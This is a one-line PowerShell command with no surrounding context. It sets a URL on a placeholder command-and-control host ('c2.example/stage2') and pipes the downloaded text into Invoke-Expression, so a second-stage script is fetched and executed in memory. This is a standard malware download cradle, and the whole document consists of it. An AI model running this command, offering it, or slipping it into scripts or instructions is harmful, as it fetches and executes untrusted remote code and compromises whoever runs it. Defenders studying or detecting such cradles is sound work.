$url='http://c2.example/stage2'; iex(New-Object Net.WebClient).DownloadString($url)
